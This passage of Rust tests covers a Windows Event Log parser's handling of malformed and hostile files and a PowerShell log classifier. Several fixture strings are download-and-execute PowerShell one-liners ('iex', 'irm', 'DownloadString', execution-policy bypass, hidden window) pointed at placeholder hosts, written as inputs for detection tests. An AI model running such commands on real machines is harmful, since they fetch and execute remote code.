    /// (`SYSTEMTIME`, minwinbase.h). The vendored crate widens before multiplying
    /// (`third_party/evtx/PROVENANCE.md`, patch 4), so every value above 999 is refused the same way
    /// 1000 to 4294 already were: the record is rejected and the rest of the chunk is read.
    ///
    /// Found by `fuzz_evtx` on `dev` (run 34869485443), not on the pull request whose content it
    /// ran against: the fuzzer takes a random seed, so one green run is not evidence about the next.
    /// This test is deterministic.
    #[test]
    fn a_systime_whose_milliseconds_overflow_is_refused_rather_than_wrapped() {
        for milliseconds in [4295, u16::MAX] {
            let file = parsed(&with_systime_milliseconds(LANGUAGE_PACK, milliseconds));

            assert_eq!(file.records.len(), 16, "milliseconds {milliseconds}");
            assert_eq!(file.rejected.len(), 1, "milliseconds {milliseconds}");
            assert_eq!(file.rejected[0].record_id, Some(1));
            assert!(matches!(
                file.rejected[0].reason,
                ParseError::Malformed {
                    field: "record",
                    ..
                }
            ));
        }
    }

    /// The other side of the test above: the rewritten record is a well-formed one while the
    /// milliseconds are in the documented range, so the rejection above is about the value and not
    /// about the rewrite. 1000 is the first value outside it, and was refused before the patch too.
    #[test]
    fn a_systime_is_read_up_to_999_milliseconds_and_refused_from_1000() {
        for milliseconds in [0, 999] {
            let file = parsed(&with_systime_milliseconds(LANGUAGE_PACK, milliseconds));
            assert!(file.rejected.is_empty(), "milliseconds {milliseconds}");
            assert_eq!(file.records.len(), 17, "milliseconds {milliseconds}");
        }

        let file = parsed(&with_systime_milliseconds(LANGUAGE_PACK, 1000));
        assert_eq!(file.records.len(), 16);
        assert_eq!(file.rejected.len(), 1);
        assert_eq!(file.rejected[0].record_id, Some(1));
    }

    /// A chunk's string table is walked chain by chain, and upstream guarded only against an entry
    /// that points at **itself**. A chain closed into a loop of two or more was walked forever: the
    /// same cache keys are overwritten each time round, so memory never grows and no allocator alarm
    /// fires, which is why the stack samples taken of it landed in the allocator and said nothing.
    /// This was the defect `third_party/evtx/PROVENANCE.md` carried as located nowhere until
    /// 2026-09-12. The vendored crate now stops when the walk reaches a position it has already
    /// cached, which loses no string: everything reachable from that position was cached by the walk
    /// that first reached it.
    ///
    /// **A regression here is a hung test, not a red one.** Nothing in this file can time out, so if
    /// the guard goes away `cargo nextest run` stops making progress on this test rather than
    /// failing it. That is also why the assertions below are about the records that come back and not
    /// merely about control returning: the file has to parse *as it did before the cycle was put in
    /// it*, or the guard is throwing away strings the records need.
    #[test]
    fn a_string_table_chain_that_closes_into_a_cycle_still_terminates() {
        let file = parsed(&with_cyclic_string_table(LANGUAGE_PACK));

        assert!(
            file.rejected.is_empty(),
            "a cycle costs the strings past it nothing: both entries are cached before the walk stops"
        );
        assert_eq!(file.records.len(), 17);
        assert_eq!(file.records[0].record_id, 1);
        assert_eq!(file.records[0].event_id, Some(4000));
        assert_eq!(
            file.records[0].channel.as_deref(),
            Some("Microsoft-Windows-LanguagePackSetup/Operational")
        );
        assert_eq!(
            file.records[0].written.to_string(),
            "2018-07-09T20:49:14.0577461Z"
        );

        // The two names the cycle is built from — `ThreadID` and `Task` — are in the `System` block
        // of every record, so a walk that stopped short of caching them would show up as records
        // that do not resolve rather than as a different count.
        let clean = parsed(LANGUAGE_PACK);
        assert_eq!(file.records, clean.records);
    }

    /// Bytes that are not an Event Log at all are the one thing that fails a whole file — there is
    /// nothing in them to recover, and saying so once is more use than a rejection per chunk.
    #[test]
    fn bytes_that_are_not_an_event_log_are_refused_as_a_whole() {
        let mut bytes = LANGUAGE_PACK.to_vec();
        bytes[..8].copy_from_slice(b"XlfFile0");

        assert!(matches!(
            records(&bytes),
            Err(ParseError::Malformed {
                field: "signature",
                ..
            })
        ));
        assert!(matches!(
            records(&[0u8; 8192]),
            Err(ParseError::Malformed {
                field: "signature",
                ..
            })
        ));
    }

    #[test]
    fn a_file_shorter_than_its_header_is_truncated() {
        assert_eq!(
            records(&LANGUAGE_PACK[..FILE_HEADER_LEN - 1]),
            Err(ParseError::Truncated {
                expected: FILE_HEADER_LEN,
                found: FILE_HEADER_LEN - 1
            })
        );
        assert_eq!(
            records(&[]),
            Err(ParseError::Truncated {
                expected: FILE_HEADER_LEN,
                found: 0
            })
        );
    }

    /// A log that has been cleared is a valid file with a header and no records in it. That is an
    /// empty result, not an error — and deciding what it means is a rule's job, not this one's.
    #[test]
    fn a_header_with_no_chunks_is_an_empty_file_not_an_error() {
        let file = parsed(&LANGUAGE_PACK[..FILE_HEADER_LEN]);

        assert!(file.records.is_empty());
        assert!(file.rejected.is_empty());
    }

    /// `error.rs` promises an error message is safe to show in either mode. An event record is full
    /// of user names, host names and command lines, so this is the promise that is easiest to break
    /// here — the upstream error type renders a chunk number, a record number and, in one variant, a
    /// message built from the file's own numbers.
    #[test]
    fn an_error_never_carries_anything_read_from_the_file() {
        let mut not_a_log = LANGUAGE_PACK.to_vec();
        not_a_log[..8].copy_from_slice(b"XlfFile0");

        let mut errors: Vec<ParseError> = Vec::new();
        for attempt in [
            records(&not_a_log),
            records(&LANGUAGE_PACK[..100]),
            records(&[]),
        ] {
            if let Err(error) = attempt {
                errors.push(error);
            }
        }
        for file in [
            with_damaged_chunk(LANGUAGE_PACK, 0),
            with_damaged_chunk(LANGUAGE_PACK, 1),
        ] {
            errors.extend(parsed(&file).rejected.into_iter().map(|one| one.reason));
        }
        assert!(!errors.is_empty(), "the inputs above should produce errors");

        for error in errors {
            let text = error.to_string().to_uppercase();
            // Every token here is distinctive enough that it cannot occur in an English sentence,
            // and — this is the part that is easy to get wrong — every one of them is verified to be
            // **present in the fixture**. A token the file never contained would make this assertion
            // pass for the wrong reason. The list shrank when the second fixture was removed: the
            // strings it held (`DESKTOP-0HIJB49`, the Windows Error Reporting paths, `SearchIndexer`,
            // `SecurityCenter`) are gone from the corpus, and asserting their absence now would prove
            // nothing. `S-1-5` and `C:\` are likewise absent from this file and were dropped for the
            // same reason.
            //
            // An earlier version looked for "WER", the Windows Error Reporting folder, and failed on
            // the word "were" inside a perfectly clean error message — a check that cries wolf is one
            // the next person learns to loosen.
            for leaked in [
                "DESKTOP-1N4R894",
                "LANGUAGEPACKSETUP",
                "MS-CV",
                "PING-RESPONSE",
            ] {
                assert!(
                    !text.contains(leaked),
                    "an error message leaked {leaked} from the file: {text}"
                );
            }
            // A chunk number, a record number and a declared size are read from the file too. They
            // are carried as typed fields of `RejectedRecord`, never quoted in a message.
            if matches!(error, ParseError::Malformed { .. }) {
                assert!(
                    !text.contains(|character: char| character.is_ascii_digit()),
                    "a malformed error quoted a number read from the file: {text}"
                );
            }
        }
    }

    /// The parser keeps a record's identity and nothing a record says. An event's payload — the user
    /// name, the host name, the command line — is deliberately not carried into this struct, so a
    /// collector cannot put it in a report by accident. This pins that: the whole parsed file,
    /// rendered, contains none of the payload strings this fixture is known to hold.
    #[test]
    fn a_records_payload_and_computer_name_are_not_kept() {
        let rendered = format!("{:?}", parsed(LANGUAGE_PACK).records);

        // Each of these is verified to be in the fixture's bytes, so its absence from the rendered
        // records is the parser withholding it rather than the file never having held it. Tokens
        // belonging only to the removed fixture were dropped rather than left to pass vacuously.
        for payload in [
            "DESKTOP-1N4R894", // the Computer field of every record
            "MS-CV",           // Windows Update correlation ids, in the payload
            "ping-response",
        ] {
            assert!(
                !rendered.contains(payload),
                "the parsed record kept {payload}, which is a record's payload and not its identity"
            );
        }
    }

    /// An `.evtx` file is read from a machine that may be hostile. No input may abort.
    #[test]
    fn no_length_of_a_real_file_panics() {
        for length in (0..LANGUAGE_PACK.len()).step_by(997) {
            let _ = records(&LANGUAGE_PACK[..length]);
        }
    }

    #[test]
    fn arbitrary_bytes_never_panic() {
        let inputs: [&[u8]; 6] = [
            b"",
            b"ElfFile0",
            b"ElfFile\x00",
            &[0xFF; 64],
            &[0x00; 4096],
            b"ElfFile0\x00\x00\x00\x00",
        ];
        for input in inputs {
            let _ = records(input);
        }

        // A real header followed by bytes that are not a chunk.
        let mut header_then_noise = LANGUAGE_PACK[..FILE_HEADER_LEN].to_vec();
        header_then_noise.extend(std::iter::repeat_n(0xFFu8, CHUNK_LEN));
        let _ = records(&header_then_noise);

        let every_byte: Vec<u8> = (0..=u8::MAX).cycle().take(8192).collect();
        for length in (0..every_byte.len()).step_by(101) {
            let _ = records(&every_byte[..length]);
        }
    }
}

#[cfg(test)]
mod powershell_tests {
    use evtx::SerializedEvtxRecord;
    use jiff::Timestamp;
    use serde_json::{Value, json};

    use super::{
        Pending, PowerShellSource, PowerShellText, powershell_text, read_powershell_record,
    };

    const LANGUAGE_PACK: &[u8] =
        include_bytes!("../../../fixtures/evtx/languagepacksetup-operational.evtx");

    /// A record as `records_json_value` renders one: `System` with the four fields this crate reads,
    /// and an `EventData` in the shape the provider gives it.
    fn rendered(
        id: u64,
        provider: &str,
        channel: &str,
        event_id: u32,
        level: u8,
        data: &Value,
    ) -> SerializedEvtxRecord<Value> {
        SerializedEvtxRecord {
            event_record_id: id,
            timestamp: Timestamp::from_second(1_791_000_000 + i64::try_from(id).unwrap_or(0))
                .unwrap_or(Timestamp::UNIX_EPOCH),
            data: json!({ "Event": {
                "System": {
                    "Provider": { "#attributes": { "Name": provider } },
                    "EventID": event_id, "Level": level, "Channel": channel,
                    "Computer": "WORKSTATION-7"
                },
                "EventData": data.clone()
            }}),
        }
    }

    fn block(
        id: u64,
        part: u64,
        total: u64,
        block_id: &str,
        text: &str,
    ) -> SerializedEvtxRecord<Value> {
        rendered(
            id,
            "Microsoft-Windows-PowerShell",
            "Microsoft-Windows-PowerShell/Operational",
            4104,
            3,
            &json!({
                "MessageNumber": part, "MessageTotal": total, "ScriptBlockText": text,
                "ScriptBlockId": block_id, "Path": "C:\\Users\\alex\\secret-notes.ps1"
            }),
        )
    }

    fn read(records: &[SerializedEvtxRecord<Value>]) -> PowerShellText {
        let mut out = PowerShellText::default();
        let mut pending = Pending::default();
        for r in records {
            read_powershell_record(r, &mut out, &mut pending);
        }
        pending.flush_all(&mut out.entries);
        out
    }

    #[test]
    fn a_log_with_neither_kind_examines_nothing() {
        let text = powershell_text(LANGUAGE_PACK).unwrap_or_default();
        assert_eq!(text.examined, 0);
        assert!(text.entries.is_empty());
        assert_eq!(
            text.rejected.len(),
            super::records(LANGUAGE_PACK).map_or(0, |f| f.rejected.len())
        );
    }

    #[test]
    fn a_flagged_block_in_parts_is_joined_before_it_is_classified() {
        // `DownloadString` is split across the two parts, and the parts arrive out of order.
        let out = read(&[
            block(
                2,
                2,
                2,
                "{b1}",
                "loadString('https://two.example.invalid/x')",
            ),
            block(1, 1, 2, "{b1}", "iex (New-Object Net.WebClient).Down"),
        ]);
        assert_eq!(out.examined, 2);
        assert_eq!(out.entries.len(), 1);
        let entry = &out.entries[0];
        assert_eq!(entry.source, PowerShellSource::ScriptBlock);
        assert!(entry.complete);
        assert!(entry.classification.kinds.download_then_execute);
        assert_eq!(
            entry.classification.download_host,
            Some(crate::powershell_text::DownloadHost::Name(
                "two.example.invalid".to_owned()
            ))
        );
    }

    #[test]
    fn a_block_whose_parts_rotated_out_is_classified_and_marked_incomplete() {
        let out = read(&[block(5, 2, 3, "{b2}", "Add-Type -MemberDefinition x")]);
        assert_eq!(out.entries.len(), 1);
        assert!(!out.entries[0].complete);
        assert!(out.entries[0].classification.kinds.native_interop);
    }

    #[test]
    fn only_the_two_kinds_are_read() {
        let loader = "iex (irm https://x.example.invalid)";
        let out = read(&[
            // Verbose 4104: every block when logging is on, which ADR 0064 does not read.
            rendered(
                1,
                "Microsoft-Windows-PowerShell",
                "Microsoft-Windows-PowerShell/Operational",
                4104,
                5,
                &json!({ "MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": loader, "ScriptBlockId": "{v}" }),
            ),
            // PowerShell 7's own provider and channel (ADR 0063 section 3).
            rendered(
                2,
                "PowerShellCore",
                "PowerShellCore/Operational",
                4104,
                3,
                &json!({ "MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": loader, "ScriptBlockId": "{c}" }),
            ),
            // 4103 at level 3 on the right channel.
            rendered(
                3,
                "Microsoft-Windows-PowerShell",
                "Microsoft-Windows-PowerShell/Operational",
                4103,
                3,
                &json!({ "Payload": loader }),
            ),
            // 400 from another provider.
            rendered(
                4,
                "Some-Other-Provider",
                "Windows PowerShell",
                400,
                4,
                &json!({ "Data": [format!("HostApplication={loader}")] }),
            ),
        ]);
        assert_eq!(out.examined, 0);
        assert!(out.entries.is_empty());
    }

    #[test]
    fn a_start_is_classified_from_host_application_in_any_rendering() {
        let detail = "\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tHostName=ConsoleHost\r\n\tHostApplication=powershell.exe -ExecutionPolicy Bypass -w h -c \"irm https://s.example.invalid/a | iex\"\r\n\tEngineVersion=5.1\r\n";
        for data in [
            json!({ "Data": ["Available", "None", detail] }),
            json!({ "Data": { "#text": ["Available", "None", detail] } }),
            json!({ "Data": detail }),
        ] {
            let out = read(&[rendered(
                9,
                "PowerShell",
                "Windows PowerShell",
                400,
                4,
                &data,
            )]);
            assert_eq!(out.examined, 1);
            let k = out.entries[0].classification.kinds;
            assert_eq!(out.entries[0].source, PowerShellSource::EngineStart);
            assert!(k.download_then_execute && k.execution_policy_bypass && k.hidden_window);
        }
        // A 400 without HostApplication is examined and holds no kind.
        let out = read(&[rendered(
            10,
            "PowerShell",
            "Windows PowerShell",
            400,
            4,
            &json!({ "Data": ["Available"] }),
        )]);
        assert_eq!(
            (out.examined, out.entries[0].classification.kinds.any()),
            (1, false)
        );
    }

    #[test]
    fn no_text_of_a_record_reaches_the_result() {
        let out = read(&[
            block(
                1,
                1,
                1,
                "{6f1c-secret-block-id}",
                "$password = 'hunter2'; iex (irm https://k.example.invalid/key/ABC?t=zz)",
            ),
            rendered(
                2,
                "PowerShell",
                "Windows PowerShell",
                400,
                4,
                &json!({ "Data": ["\tHostApplication=powershell.exe -c Get-Secret -Vault personal-vault\r\n"] }),
            ),
        ]);
        let all = format!("{out:?}");
        for text in [
            "hunter2",
            "password",
            "6f1c",
            "secret-notes",
            "alex",
            "WORKSTATION",
            "ABC",
            "zz",
            "personal-vault",
            "Get-Secret",
        ] {
            assert!(!all.contains(text), "{text} leaked: {all}");
        }
    }

    #[test]
    fn a_block_larger_than_the_limit_is_cut_and_marked_incomplete() {
        let big = "x".repeat(super::BLOCK_TEXT_MAX);
        let out = read(&[
            block(1, 1, 2, "{big}", &big),
            block(2, 2, 2, "{big}", "iex"),
        ]);
        assert_eq!(out.entries.len(), 1);
        assert!(!out.entries[0].complete);
    }
}
